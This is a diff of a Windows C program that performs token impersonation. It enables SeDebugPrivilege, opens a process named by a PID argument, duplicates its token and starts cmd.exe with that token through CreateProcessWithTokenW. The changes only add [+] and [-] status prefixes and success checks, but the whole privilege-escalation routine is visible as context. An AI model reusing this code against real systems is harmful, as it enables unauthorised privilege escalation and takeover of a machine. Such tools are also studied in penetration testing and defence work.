@@ -16,7 +16,7 @@ BOOL SetPrivilege(
 		lpszPrivilege,   // privilege to lookup 
 		&luid))        // receives LUID of privilege
 	{
-		printf("LookupPrivilegeValue error: %u\n", GetLastError());
+		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
 		return FALSE;
 	}
 
@@ -37,14 +37,14 @@ BOOL SetPrivilege(
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
 		return FALSE;
 	}
 
 	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
 
 	{
-		printf("The token does not have the specified privilege. \n");
+		printf("[-] The token does not have the specified privilege. \n");
 		return FALSE;
 	}
 
@@ -57,7 +57,7 @@ int main(int argc, char** argv) {
 	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
 	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
 	{
-		printf("SeDebugPrivilege enabled!\n");
+		printf("[+] SeDebugPrivilege enabled!\n");
 	}
 
 	// Grab PID from command line argument
@@ -75,29 +75,43 @@ int main(int argc, char** argv) {
 
 	// Call OpenProcess(), print return code and error code
 	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
-	printf("OpenProcess() Return Code: %i\n", processHandle);
-	printf("OpenProcess() Error: %i\n", GetLastError());
-
+	if (GetLastError() == NULL)
+		printf("[+] OpenProcess success!\n");
+	else
+	{
+		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
+		printf("[-] OpenProcess() Error: %i\n", GetLastError());
+	}
+	
 	// Call OpenProcessToken(), print return code and error code
 	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
-	printf("OpenProcessToken() Return Code: %i\n", getToken);
-	printf("OpenProcessToken() Error: %i\n", GetLastError());
+	if (GetLastError() == NULL)
+		printf("[+] OpenProcessToken() success!\n");
+	else
+	{
+		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
+		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
+	}
 
 	// Call DuplicateTokenEx(), print return code and error code
 	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
-	printf("DuplicateTokenEx() Return Code: %i\n", duplicateToken);
-	printf("DupicateTokenEx() Error: %i\n", GetLastError());
-
+	if (GetLastError() == NULL)
+		printf("[+] DuplicateTokenEx() success!\n");
+	else
+	{
+		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
+		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
+	}
+	
 	// Call CreateProcessWithTokenW(), print return code and error code
 	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
-	printf("CreateProcessWithTokenW Return Code: %i\n", createProcess);
-	printf("CreateProcessWithTokenW Error: %i\n", GetLastError());
-
-	// Check last error to determine if process was spawned
 	if (GetLastError() == NULL)
-		printf("Process spawned!\n");
+		printf("[+] Process spawned!\n");
 	else
-		printf("Process failed to spawn, check last error :(\n");
+	{
+		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
+		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
+	}
 
 	return 0;
 }
